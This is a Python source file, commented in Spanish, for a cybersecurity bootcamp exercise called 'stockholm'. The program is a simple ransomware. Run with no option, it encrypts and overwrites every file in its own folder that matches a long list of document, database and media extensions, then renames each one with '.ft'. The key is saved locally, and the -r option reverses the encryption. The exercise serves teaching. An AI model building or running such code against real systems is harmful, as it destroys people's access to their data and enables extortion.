import argparse
import os

from cryptography.fernet import Fernet


# PROBLEMA:
# Crear un programa llamado 'stockholm' capaz de cifrar y descifrar ficheros.
# -r <clave>: revierte la infección usando la clave de cifrado.
# -v: muestra la versión del programa.
# -s: desactiva la información mostrada por pantalla.
# Si no se especifica ninguna opción, el programa cifra todos los ficheros de la carpeta del script.


# ----------------------------------------------------------------------------------------------------------------------


# Variables globales (y sus valores por defecto).
ver_sem = "0.2"
extensiones = ['.123', '.3dm', '.3ds', '.3g2', '.3gp', '.602', '.7z', '.ARC', '.PAQ', '.accdb', '.aes', '.ai', '.asc',
               '.asf', '.asm', '.asp', '.avi', '.backup', '.bak', '.bat', '.bmp', '.brd', '.bz2', '.c', '.cgm',
               '.class', '.cmd', '.cpp', '.crt', '.cs', '.csv', '.db', '.dbf', '.dch', '.der', '.dif', '.dip', '.djvu',
               '.doc', '.docb', '.docm', '.docx', '.dot', '.dotm', '.dotx', '.dwg', '.edb', '.eml', '.fla', '.flv',
               '.frm', '.gif', '.gpg', '.gz', '.h', '.hwp', '.ibd', '.iso', '.jar', '.java', '.jpeg', '.jpg', '.js',
               '.jsp', '.lay', '.lay6', '.ldf', '.m3u', '.m4u', '.max', '.mdb', '.mdf', '.mid', '.mkv', '.mml', '.mov',
               '.mp3', '.mp4', '.mpeg', '.mpg', '.msg', '.myd', '.myi', '.nef', '.odb', '.odg', '.odp', '.ods', '.odt',
               '.onetoc2', '.ost', '.otg', '.otp', '.ots', '.ott', '.pas', '.pdf', '.pem', '.pfx', '.php', '.pl',
               '.png', '.pot', '.potm', '.potx', '.ppam', '.pps', '.ppsm', '.ppsx', '.ppt', '.pptm', '.pptx', '.ps1',
               '.psd', '.pst', '.rar', '.raw', '.rb', '.rtf', '.sch', '.sh', '.sldm', '.sldx', '.slk', '.sln', '.snt',
               '.sql', '.sqlite3', '.sqlitedb', '.stc', '.std', '.sti', '.suo', '.svg', '.swf', '.sxc', '.sxd', '.sxi',
               '.sxm', '.sxw', '.tar', '.tbk', '.tgz', '.tif', '.tiff', '.txt', '.uop', '.uot', '.vb', '.vbs', '.vcd',
               '.vdi', '.vmdk', '.vmx', '.vob', '.vsd', '.vsdx', '.wav', '.wb2', '.wk1', '.wks', '.wma', '.wmv', '.xlc',
               '.xlm', '.xls', '.xlsb', '.xlsm', '.xlsx', '.xlt', '.xltm', '.xltx', '.xlw', '.zip', 'csr', 'p12']


# Leer los argumentos de entrada de la línea de comandos.
def leer_argumentos():
    # Inicializar el analizador de argumentos.
    analizador = inicializar_analizador()

    return analizador.r, analizador.v, analizador.s


# Inicializar el parser de la línea de comandos.
def inicializar_analizador():
    # Analizador de argumentos de la línea de comandos.
    analizador = argparse.ArgumentParser(
        # prog="./stockholm",
        description="Herramienta casera para 'secuestrar' y 'liberar' ficheros.",
        epilog="Ejercicio 'stockholm' del Bootcamp de Ciberseguridad de la Fundación 42 (Málaga).",
    )

    # Agregar las opciones del comando.
    analizador.add_argument(
        "-r",
        metavar="clave",
        help="revierte la infección usando la clave de cifrado.",
        type=str)
    analizador.add_argument(
        "-v",
        help="versión del programa.",
        action="store_true")
    analizador.add_argument(
        "-s",
        help="desactiva la información mostrada por pantalla.",
        action="store_true")

    # Obtener los argumentos de la línea de comandos.
    return analizador.parse_args()


# Comprueba que un fichero tiene alguna de las extensiones indicadas.
def validar_fichero(elemento, modo):
    # El objeto es un fichero, pero ninguno 'importante'.
    if os.path.isfile(elemento) and elemento not in ["stockholm.py", "clave.key"]:

        # Comprobar validez respecto al cifrado (extensiones compatibles).
        if modo == "c":
            # Comprobar la extensión.
            for extension in extensiones:
                if elemento.endswith(extension):
                    return True

        # Comprobar validez respecto al descifrado (extensión es ' .ft').
        elif modo == "d":
            # Comprobar la extensión.
            if elemento.endswith(".ft"):
                return True

        else:
            print("Error: modo inexistente de validación de fichero.")
            print("Formatos aceptados: 'c' (cifrado) o 'd' (descifrado).")
            exit(1)

    return False


# Cifra los archivos del directorio de este script que tenga alguna de las extensiones indicadas.
# Una vez cifrados les añade la extensión '.ft' y los guarda en un directorio llamado 'infection'.
def secuestrar():
    ficheros = []

    # Obtener todos los elementos en el directorio de este script.
    for elemento in os.listdir("."):
        # Comprobar la validez del fichero para su cifrado.
        if validar_fichero(elemento, "c"):
            ficheros.append(elemento)

    if not silencio:
        print("Ficheros:", sorted(ficheros))

    # Generar una clave de cifrado.
    clave = Fernet.generate_key()

    # Escribir la clave en un fichero.
    with open("clave.key", "wb") as f:
        f.write(clave)

    # Cifrar los ficheros obtenidos anteriormente.
    for fichero in ficheros:
        # Extraer y cifrar el contenido del fichero.
        with open(fichero, "rb") as f:
            cifrado = Fernet(clave).encrypt(f.read())

        # Escribir el contenido cifrado del fichero.
        with open(fichero, "wb") as f:
            f.write(cifrado)

        # Renombrar el fichero añadiendo la extensión.
        os.rename(fichero, fichero + ".ft")

    # Devuelve la cantidad de ficheros cifrados.
    return len(ficheros)


# Descifrar los archivos del directorio de este script que tengan
# la extensión '.ft', salvo que su extensión original ya fuera '.ft'.
def liberar():
    ficheros = []

    # Obtener todos los elementos en el directorio de este script.
    for elemento in os.listdir("."):
        # Comprobar la validez del elemento para su descifrado.
        if validar_fichero(elemento, "d"):
            ficheros.append(elemento)

    # Leer la clave de cifrado.
    with open("clave.key", "rb") as f:
        clave = f.read()

    # Descifrar los ficheros obtenidos anteriormente.
    for fichero in ficheros:
        try:
            # Extraer y descifrar el contenido del fichero.
            with open(fichero, "rb") as f:
                descifrado = Fernet(clave).decrypt(f.read())

            # Escribir el contenido descifrado del fichero.
            with open(fichero, "wb") as f:
                f.write(descifrado)

            # Renombrar el fichero cifrado
            os.rename(fichero, fichero[:-3])    # '[:-3]' para el devolver el nombre hasta el '.ft' que mide 3 caracteres.

        # Si se intenta descifrar un fichero que no ha sido cifrado (es '.ft' sin extensión original).
        except Exception as e:
            # Extraer el fichero de la lista de ficheros descifrados.
            ficheros.remove(fichero)

    if not silencio and ficheros:
        print("Ficheros:", sorted(ficheros))

    # Devuelve la cantidad de ficheros descifrados.
    return len(ficheros)


# ----------------------------------------------------------------------------------------------------------------------


if __name__ == "__main__":
    # Leer los argumentos de entrada de la línea de comandos.
    revertir, version, silencio = leer_argumentos()

    # Se solicitó la versión del programa (-v).
    if version:
        print("Versión:", ver_sem)

    # Se solicitó descifrar los ficheros (-r).
    elif revertir:
        contador = liberar()

        if not silencio:
            print("Se descifraron {} ficheros.".format(contador))

    # Se solicitó cifrar los ficheros (ninguna opción).
    else:
        contador = secuestrar()

        if not silencio:
            print("Se cifraron {} ficheros.".format(contador))
